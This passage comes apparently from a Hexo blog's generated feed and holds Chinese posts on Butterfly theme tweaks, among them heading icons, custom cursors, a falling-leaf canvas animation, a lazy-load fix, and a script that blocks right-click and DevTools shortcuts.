class="line">    transform: rotate(0deg);</span><br><span class="line">  &#125;</span><br><span class="line">  to &#123;</span><br><span class="line">    -webkit-transform: rotate(-1turn);</span><br><span class="line">    transform: rotate(-1turn);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 设置风车颜色 */</span></span><br><span class="line">#content-inner.layout h1::before &#123;</span><br><span class="line">  color: #ef50a8;</span><br><span class="line">  margin-left: -<span class="number">1.</span>55rem;</span><br><span class="line">  font-size: <span class="number">1.</span>3rem;</span><br><span class="line">  margin-top: -<span class="number">0.</span>23rem;</span><br><span class="line">&#125;</span><br><span class="line">#content-inner.layout h2::before &#123;</span><br><span class="line">  color: #fb7061;</span><br><span class="line">  margin-left: -<span class="number">1.</span>35rem;</span><br><span class="line">  font-size: <span class="number">1.</span>1rem;</span><br><span class="line">  margin-top: -<span class="number">0.</span>12rem;</span><br><span class="line">&#125;</span><br><span class="line">#content-inner.layout h3::before &#123;</span><br><span class="line">  color: #ffbf00;</span><br><span class="line">  margin-left: -<span class="number">1.</span>22rem;</span><br><span class="line">  font-size: <span class="number">0.</span>95rem;</span><br><span class="line">  margin-top: -<span class="number">0.</span>09rem;</span><br><span class="line">&#125;</span><br><span class="line">#content-inner.layout h4::before &#123;</span><br><span class="line">  color: #a9e000;</span><br><span class="line">  margin-left: -<span class="number">1.</span>05rem;</span><br><span class="line">  font-size: <span class="number">0.</span>8rem;</span><br><span class="line">  margin-top: -<span class="number">0.</span>09rem;</span><br><span class="line">&#125;</span><br><span class="line">#content-inner.layout h5::before &#123;</span><br><span class="line">  color: #57c850;</span><br><span class="line">  margin-left: -<span class="number">0.</span>9rem;</span><br><span class="line">  font-size: <span class="number">0.</span>7rem;</span><br><span class="line">  margin-top: 0rem;</span><br><span class="line">&#125;</span><br><span class="line">#content-inner.layout h6::before &#123;</span><br><span class="line">  color: #5ec1e0;</span><br><span class="line">  margin-left: -<span class="number">0.</span>9rem;</span><br><span class="line">  font-size: <span class="number">0.</span>66rem;</span><br><span class="line">  margin-top: 0rem;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* s设置风车hover动效 6s那里可以自己调节快慢*/</span></span><br><span class="line">#content-inner.layout h1:hover,</span><br><span class="line">#content-inner.layout h2:hover,</span><br><span class="line">#content-inner.layout h3:hover,</span><br><span class="line">#content-inner.layout h4:hover,</span><br><span class="line">#content-inner.layout h5:hover,</span><br><span class="line">#content-inner.layout h6:hover &#123;</span><br><span class="line">  color: <span class="keyword">var</span>(--theme-color);</span><br><span class="line">&#125;</span><br><span class="line">#content-inner.layout h1:hover::before,</span><br><span class="line">#content-inner.layout h2:hover::before,</span><br><span class="line">#content-inner.layout h3:hover::before,</span><br><span class="line">#content-inner.layout h4:hover::before,</span><br><span class="line">#content-inner.layout h5:hover::before,</span><br><span class="line">#content-inner.layout h6:hover::before &#123;</span><br><span class="line">  color: <span class="keyword">var</span>(--theme-color);</span><br><span class="line">  -webkit-animation: ccc 6s linear infinite;</span><br><span class="line">  animation: ccc 6s linear infinite;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、并在 _config.butterfly.yml 中找到 <a href="https://so.csdn.net/so/search?q=inject&spm=1001.2101.3001.7020">inject</a>，在 head 下添加</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">- &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/css/icon.css&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>最终展示效果如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111534447.png" alt="img"> </p><h1 id="自定义鼠标指针样式"><a href="#自定义鼠标指针样式" class="headerlink" title="自定义鼠标指针样式"></a><strong>自定义鼠标指针样式</strong></h1><p>1、选定好看的鼠标样式，这块为了简答，选择两种鼠标样式，如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111535448.png" alt="img"> </p><p>下载地址为：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//cdn.jsdelivr.net/gh/TRHX/CDN-for-itrhx.com@1.0/images/mouse.cur</span></span><br><span class="line">https:<span class="comment">//cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/img/pointer.cur</span></span><br></pre></td></tr></table></figure><p>2、在 &#x2F;themes&#x2F;butterfly&#x2F;source&#x2F;css路径下创建一个mouse.css文件，在文件中添加如下代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">  cursor:url(/img/pointer/mouse.cur),</span><br><span class="line">        <span class="keyword">default</span>;</span><br><span class="line">&#125;</span><br><span class="line">a,</span><br><span class="line">img &#123;</span><br><span class="line">  cursor:url(/img/pointer/pointer.cur),</span><br><span class="line">        <span class="keyword">default</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、打开站点主题配置文件_config.butterfly.yml，找到inject，在head处直接引入该文件：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">  - &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/css/mouse.css&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>效果如下所示：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111535495.png" alt="img"> </p><h1 id="添加背景动态彩带效果"><a href="#添加背景动态彩带效果" class="headerlink" title="添加背景动态彩带效果"></a>添加背景动态彩带效果</h1><p>butterfly提供三种效果：静止彩带、动态彩带、canvas_nest</p><p>我选的是动态彩条，修改主题配置文件：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">canvas_fluttering_ribbon: # 动态彩带</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  mobile: <span class="literal">false</span> # <span class="literal">false</span> 手机端不显示 <span class="literal">true</span> 手机端显示</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111535952.png" alt="img"> </p><h1 id="添加枫叶飘落效果"><a href="#添加枫叶飘落效果" class="headerlink" title="添加枫叶飘落效果"></a>添加枫叶飘落效果</h1><p>步骤和前面的基本类似，都是本地引入JS文件，在配置文件中直接调用即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> stop, staticx;</span><br><span class="line"><span class="type">var</span> <span class="variable">img</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">img.src = <span class="string">&quot;https://img.cdn.nesxc.com/2022/02/202202251325420webp&quot;</span>;</span><br><span class="line"></span><br><span class="line">function <span class="title function_">Sakura</span><span class="params">(x, y, s, r, fn)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.x = x;</span><br><span class="line">    <span class="built_in">this</span>.y = y;</span><br><span class="line">    <span class="built_in">this</span>.s = s;</span><br><span class="line">    <span class="built_in">this</span>.r = r;</span><br><span class="line">    <span class="built_in">this</span>.fn = fn</span><br><span class="line">&#125;</span><br><span class="line">Sakura.prototype.draw = function(cxt) &#123;</span><br><span class="line">    cxt.save();</span><br><span class="line">    <span class="type">var</span> <span class="variable">xc</span> <span class="operator">=</span> <span class="number">20</span> * <span class="built_in">this</span>.s / <span class="number">2</span>;</span><br><span class="line">    cxt.translate(<span class="built_in">this</span>.x, <span class="built_in">this</span>.y);</span><br><span class="line">    cxt.rotate(<span class="built_in">this</span>.r);</span><br><span class="line">    cxt.drawImage(img, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span> * <span class="built_in">this</span>.s, <span class="number">20</span> * <span class="built_in">this</span>.s);</span><br><span class="line">    cxt.restore()</span><br><span class="line">&#125;;</span><br><span class="line">Sakura.prototype.update = function() &#123;</span><br><span class="line">    <span class="built_in">this</span>.x = <span class="built_in">this</span>.fn.x(<span class="built_in">this</span>.x, <span class="built_in">this</span>.y);</span><br><span class="line">    <span class="built_in">this</span>.y = <span class="built_in">this</span>.fn.y(<span class="built_in">this</span>.y, <span class="built_in">this</span>.y);</span><br><span class="line">    <span class="built_in">this</span>.r = <span class="built_in">this</span>.fn.r(<span class="built_in">this</span>.r);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.x &gt; window.innerWidth || <span class="built_in">this</span>.x &lt; <span class="number">0</span> || <span class="built_in">this</span>.y &gt; window.innerHeight || <span class="built_in">this</span>.y &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.r = getRandom(<span class="string">&quot;fnr&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (Math.random() &gt; <span class="number">0.4</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.x = getRandom(<span class="string">&quot;x&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.y = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">this</span>.s = getRandom(<span class="string">&quot;s&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.r = getRandom(<span class="string">&quot;r&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.x = window.innerWidth;</span><br><span class="line">            <span class="built_in">this</span>.y = getRandom(<span class="string">&quot;y&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.s = getRandom(<span class="string">&quot;s&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.r = getRandom(<span class="string">&quot;r&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">SakuraList = function() &#123;</span><br><span class="line">    <span class="built_in">this</span>.list = []</span><br><span class="line">&#125;;</span><br><span class="line">SakuraList.prototype.push = function(sakura) &#123;</span><br><span class="line">    <span class="built_in">this</span>.list.push(sakura)</span><br><span class="line">&#125;;</span><br><span class="line">SakuraList.prototype.update = function() &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">var</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, len = <span class="built_in">this</span>.list.length; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="built_in">this</span>.list[i].update()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">SakuraList.prototype.draw = function(cxt) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">var</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, len = <span class="built_in">this</span>.list.length; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="built_in">this</span>.list[i].draw(cxt)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">SakuraList.prototype.get = function(i) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.list[i]</span><br><span class="line">&#125;;</span><br><span class="line">SakuraList.prototype.size = function() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.list.length</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function <span class="title function_">getRandom</span><span class="params">(option)</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> ret, random;</span><br><span class="line">    <span class="keyword">switch</span> (option) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;x&quot;</span>:</span><br><span class="line">            ret = Math.random() * window.innerWidth;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;y&quot;</span>:</span><br><span class="line">            ret = Math.random() * window.innerHeight;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;s&quot;</span>:</span><br><span class="line">            ret = Math.random();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;r&quot;</span>:</span><br><span class="line">            ret = Math.random() * <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;fnx&quot;</span>:</span><br><span class="line">            random = -<span class="number">0.5</span> + Math.random() * <span class="number">1</span>;</span><br><span class="line">            ret = function(x, y) &#123;</span><br><span class="line">                <span class="keyword">return</span> x + <span class="number">0.5</span> * random - <span class="number">1.7</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;fny&quot;</span>:</span><br><span class="line">            random = <span class="number">1.5</span> + Math.random() * <span class="number">0.7</span>;</span><br><span class="line">            ret = function(x, y) &#123;</span><br><span class="line">                <span class="keyword">return</span> y + random</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;fnr&quot;</span>:</span><br><span class="line">            random = Math.random() * <span class="number">0.03</span>;</span><br><span class="line">            ret = function(r) &#123;</span><br><span class="line">                <span class="keyword">return</span> r + random</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function <span class="title function_">startSakura</span><span class="params">()</span> &#123;</span><br><span class="line">    requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame || window.oRequestAnimationFrame;</span><br><span class="line">    <span class="type">var</span> <span class="variable">canvas</span> <span class="operator">=</span> document.createElement(<span class="string">&quot;canvas&quot;</span>),</span><br><span class="line">        cxt;</span><br><span class="line">    staticx = <span class="literal">true</span>;</span><br><span class="line">    canvas.height = window.innerHeight;</span><br><span class="line">    canvas.width = window.innerWidth;</span><br><span class="line">    canvas.setAttribute(<span class="string">&quot;style&quot;</span>, <span class="string">&quot;position: fixed;left: 0;top: 0;pointer-events: none;&quot;</span>);</span><br><span class="line">    canvas.setAttribute(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;canvas_sakura&quot;</span>);</span><br><span class="line">    document.getElementsByTagName(<span class="string">&quot;body&quot;</span>)[<span class="number">0</span>].appendChild(canvas);</span><br><span class="line">    cxt = canvas.getContext(<span class="string">&quot;2d&quot;</span>);</span><br><span class="line">    <span class="type">var</span> <span class="variable">sakuraList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SakuraList</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">var</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> sakura, randomX, randomY, randomS, randomR, randomFnx, randomFny;</span><br><span class="line">        randomX = getRandom(<span class="string">&quot;x&quot;</span>);</span><br><span class="line">        randomY = getRandom(<span class="string">&quot;y&quot;</span>);</span><br><span class="line">        randomR = getRandom(<span class="string">&quot;r&quot;</span>);</span><br><span class="line">        randomS = getRandom(<span class="string">&quot;s&quot;</span>);</span><br><span class="line">        randomFnx = getRandom(<span class="string">&quot;fnx&quot;</span>);</span><br><span class="line">        randomFny = getRandom(<span class="string">&quot;fny&quot;</span>);</span><br><span class="line">        randomFnR = getRandom(<span class="string">&quot;fnr&quot;</span>);</span><br><span class="line">        sakura = <span class="keyword">new</span> <span class="title class_">Sakura</span>(randomX, randomY, randomS, randomR, &#123;</span><br><span class="line">            x: randomFnx,</span><br><span class="line">            y: randomFny,</span><br><span class="line">            r: randomFnR</span><br><span class="line">        &#125;);</span><br><span class="line">        sakura.draw(cxt);</span><br><span class="line">        sakuraList.push(sakura)</span><br><span class="line">    &#125;</span><br><span class="line">    stop = requestAnimationFrame(function() &#123;</span><br><span class="line">        cxt.clearRect(<span class="number">0</span>, <span class="number">0</span>, canvas.width, canvas.height);</span><br><span class="line">        sakuraList.update();</span><br><span class="line">        sakuraList.draw(cxt);</span><br><span class="line">        stop = requestAnimationFrame(arguments.callee)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">window.onresize = function() &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">canvasSnow</span> <span class="operator">=</span> document.getElementById(<span class="string">&quot;canvas_snow&quot;</span>)</span><br><span class="line">&#125;;</span><br><span class="line">img.onload = function() &#123;</span><br><span class="line">    startSakura()</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function <span class="title function_">stopp</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (staticx) &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">child</span> <span class="operator">=</span> document.getElementById(<span class="string">&quot;canvas_sakura&quot;</span>);</span><br><span class="line">        child.parentNode.removeChild(child);</span><br><span class="line">        window.cancelAnimationFrame(stop);</span><br><span class="line">        staticx = <span class="literal">false</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        startSakura()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在配置文件中引入：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inject:</span><br><span class="line">  head</span><br><span class="line">  bottom:</span><br><span class="line">    - &lt;script src=<span class="string">&quot;/js/leaves.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 主题美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决hexo开启懒加载后图片无法立即显示的问题</title>
      <link href="/2024/04/11/%E8%A7%A3%E5%86%B3hexo%E5%BC%80%E5%90%AF%E6%87%92%E5%8A%A0%E8%BD%BD%E5%90%8E%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E7%AB%8B%E5%8D%B3%E6%98%BE%E7%A4%BA%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2024/04/11/%E8%A7%A3%E5%86%B3hexo%E5%BC%80%E5%90%AF%E6%87%92%E5%8A%A0%E8%BD%BD%E5%90%8E%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E7%AB%8B%E5%8D%B3%E6%98%BE%E7%A4%BA%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="本文目的"><a href="#本文目的" class="headerlink" title="本文目的"></a>本文目的</h1><p>主要介绍hexo-lazyload-image（图片懒加载）插件引发的bug以及相关API</p><h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>网站开启图片懒加载后，首次加载页面图片不显示，但是刷新一次后会显示。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111526969.png" alt="img"> </p><h1 id="定位原因"><a href="#定位原因" class="headerlink" title="定位原因"></a>定位原因</h1><p>为了提升网页的浏览体验，开启了pjax优化，其原理在于pjax封装了ajax实现局部刷新，将网站变成了单页面应用。</p><p>懒加载插件如果配置不当，将与pjax插件发生冲突，导致以上bug。</p><h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>找到hexo项目的根目录下的站点配置文件_config.yml，具体路径：blog&#x2F;_config.yml，其中blog是你的项目文件夹。</p><p>找到lazyload配置，添上isSPA: true字段即可。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyload:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  onlypost: <span class="literal">false</span> # optional</span><br><span class="line">  loadingImg: # optional eg ./images/loading.gif</span><br><span class="line">  isSPA: <span class="literal">true</span> # optional</span><br></pre></td></tr></table></figure><h1 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h1><p>来仔细看一下hexo-lazyload-image 插件的API，它共有5个配置项：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyload:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  onlypost: <span class="literal">false</span> # optional</span><br><span class="line">  loadingImg: # optional eg ./images/loading.gif</span><br><span class="line">  isSPA: <span class="literal">false</span> # optional</span><br><span class="line">  preloadRatio: <span class="number">3</span> # optional, <span class="keyword">default</span> is <span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>onlypost</strong></p><ul><li>true：只有路由页面或者文章的图片才会被懒加载。</li><li>false：除了站点背景图（如果有的话），整个站点的图片均会被懒加载。</li></ul><p><strong>loadingImg</strong>：指定的话，加载自定义路径的图片用作文章图片加载时显示，不指定的话显示默认图片。</p><p><strong>isSPA</strong></p><ul><li>true：针对单页面应用，当滚动条滚动到图片位置时就会向后端请求图片</li><li>false：刷新才能请求图片</li></ul><p><strong>preloadRatio</strong>：在多少倍的可见区域时触发图片请求，默认为1，即当前屏幕的区域。</p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 懒加载 </tag>
            
            <tag> 博客优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo禁用调试模式</title>
      <link href="/2024/04/09/Hexo%E7%A6%81%E7%94%A8%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8F/"/>
      <url>/2024/04/09/Hexo%E7%A6%81%E7%94%A8%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>网站禁用调试模式是一种常见的网站安全措施，旨在防止攻击者利用浏览器开发工具（如Chrome DevTools）对网站进行恶意攻击或窃取敏感信息。禁用调试模式通过限制或禁止开发工具的使用，增强网站的安全防护。</p><p>实现网站禁用调试模式的技术方法有多种。一种常见的方法是在网页代码中插入JavaScript代码来检测是否打开了开发工具。如果检测到开发工具被打开，则会禁用页面的一些功能，或将页面重定向到其他页面。这种方法的实现相对简单，但也存在一定的被绕过风险。</p><p>另一种更为安全的方法是使用服务器端的技术来检测是否打开了开发工具。服务器端可以检测客户端请求头中的User-Agent字段，以识别浏览器和开发工具的类型。如果检测到请求头中包含开发工具的信息，服务器端可以采取相应的措施来禁止对网站进行攻击。</p><p>本文主要介绍通过网站中引入JavaScript代码，禁止攻击者打开DEvtools实现。</p><h1 id="0x01-实现步骤"><a href="#0x01-实现步骤" class="headerlink" title="0x01 实现步骤"></a>0x01 实现步骤</h1><h2 id="新建bandev-js文件"><a href="#新建bandev-js文件" class="headerlink" title="新建bandev.js文件"></a>新建bandev.js文件</h2><p>在theme对应主题下的新建  source&#x2F;js&#x2F;bandev.js（自行修改提示文字）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//禁止右键</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">oncontextmenu</span> = <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&quot;event.returnValue=false;&quot;</span>) <span class="comment">//禁用右键</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听按键</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onkeydown</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// f12</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">123</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;F12被禁用&quot;</span>);</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ctrl+shift+i</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">ctrlKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">shiftKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">73</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;ctrl+shift+i被禁用&quot;</span>);</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ctrl+s</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">ctrlKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">83</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;ctrl+s被禁用&quot;</span>);</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">// ctrl+p</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">ctrlKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;ctrl+p被禁用&quot;</span>);</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//禁止先打开控制台然后强行进入</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">// 这里我做的是跳转首页，可以根据实际需要进行其他限制</span></span><br><span class="line">    <span class="keyword">var</span> domain = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">host</span>;<span class="comment">// 获取当前域名</span></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;https://&quot;</span> + domain;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">outerHeight</span> - <span class="variable language_">window</span>.<span class="property">innerHeight</span> &gt; <span class="number">150</span>) &#123;</span><br><span class="line">    <span class="title function_">a</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">outerWidth</span> - <span class="variable language_">window</span>.<span class="property">innerWidth</span> &gt; <span class="number">150</span>) &#123;</span><br><span class="line">    <span class="title function_">a</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要分为三个方面的思路：</p><p>1、禁止右键</p><p>2、禁止特定按键</p><p>3、禁止先打开控制台后强制进入</p><p>下面具体说明这三个的实现方法：</p><h2 id="禁止右键"><a href="#禁止右键" class="headerlink" title="禁止右键"></a>禁止右键</h2><p>1、最简单的一行代码搞定：document.oncontextmenu是一个事件处理器，它会在用户尝试在文档上执行右键点击（即打开上下文菜单）时被触发，调用函数，将event.returnValue设置为false默认阻止此事件的发生。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.oncontextmenu = new Function(&quot;event.returnValue=false;&quot;) //禁用右键</span><br></pre></td></tr></table></figure><p>2、但需要注意，上面的代码适用于旧的浏览器（如IE）版本，在更现代的浏览器（如Chrome, Firefox等）中，这种方式可能不会起作用。对于更现代的浏览器，通常会使用event.preventDefault()方法来阻止默认行为。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.oncontextmenu = function(event) &#123;  </span><br><span class="line">    event.preventDefault();  </span><br><span class="line">    return false;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="禁止特定按键"><a href="#禁止特定按键" class="headerlink" title="禁止特定按键"></a>禁止特定按键</h2><p>防止F12和shift+ctrl+i调起开发者工具；并且禁用ctrl+s和ctrl+s，防止对网页内容本地保存</p><p>监听按键事件，对上述的按件进行监听，如果监听到设置event.returnValue &#x3D; false。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 监听按键</span><br><span class="line">document.onkeydown = function () &#123;</span><br><span class="line">    // f12</span><br><span class="line">    if (window.event &amp;&amp; window.event.keyCode == 123) &#123;</span><br><span class="line">        alert(&quot;F12被禁用&quot;);</span><br><span class="line">        event.keyCode = 0;</span><br><span class="line">        event.returnValue = false;</span><br><span class="line">    &#125;</span><br><span class="line">    // ctrl+shift+i</span><br><span class="line">    if (window.event.ctrlKey &amp;&amp; window.event.shiftKey &amp;&amp; window.event.keyCode == 73) &#123;</span><br><span class="line">        alert(&quot;ctrl+shift+i被禁用&quot;);</span><br><span class="line">        event.keyCode = 0;</span><br><span class="line">        event.returnValue = false;</span><br><span class="line">    &#125;</span><br><span class="line">    // ctrl+s</span><br><span class="line">    if (window.event.ctrlKey &amp;&amp; window.event.keyCode == 83) &#123;</span><br><span class="line">        alert(&quot;ctrl+s被禁用&quot;);</span><br><span class="line">        event.keyCode = 0;</span><br><span class="line">        event.returnValue = false;</span><br><span class="line">    &#125;</span><br><span class="line">     // ctrl+p</span><br><span class="line">    if (window.event.ctrlKey &amp;&amp; window.event.keyCode == 80) &#123;</span><br><span class="line">        alert(&quot;ctrl+p被禁用&quot;);</span><br><span class="line">        event.keyCode = 0;</span><br><span class="line">        event.returnValue = false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="禁止先打开控制台后强制进入"><a href="#禁止先打开控制台后强制进入" class="headerlink" 